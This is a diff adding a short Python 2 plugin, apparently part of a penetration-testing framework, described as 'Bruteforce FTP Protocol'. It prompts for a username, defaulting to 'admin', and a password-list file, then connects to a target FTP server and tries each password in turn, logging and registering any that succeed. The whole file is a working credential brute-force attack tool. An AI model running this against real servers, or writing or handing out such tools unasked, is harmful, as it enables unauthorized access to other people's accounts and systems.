@@ -1,0 +1,26 @@
+#!/usr/bin/python
+Description = 'Bruteforce FTP Protocol.'
+
+from plugin_support import *
+from ftplib import FTP
+
+try:
+	df = "admin"
+	users = raw_input("[.] Enter user [" + df + "]: ") or df
+	passlist = raw_input("[.] Enter passlist directory: ")
+	ftp = FTP()
+	ftp.connect(ask.target,int(ask.LPORT)) 
+
+	with open(passlist,'r') as passwords:
+		for password in passwords:
+			password=password.replace("\n","")
+			try:
+				ftp.login(users,password)
+				if True:
+					success("Successfully with ["+users+"]["+password+"]\n")
+					Space()
+					UTIL.sRegister(init,password)
+			except:
+				fail(" | Checking '"+password+"'")
+except KeyboardInterrupt:
+	exit()
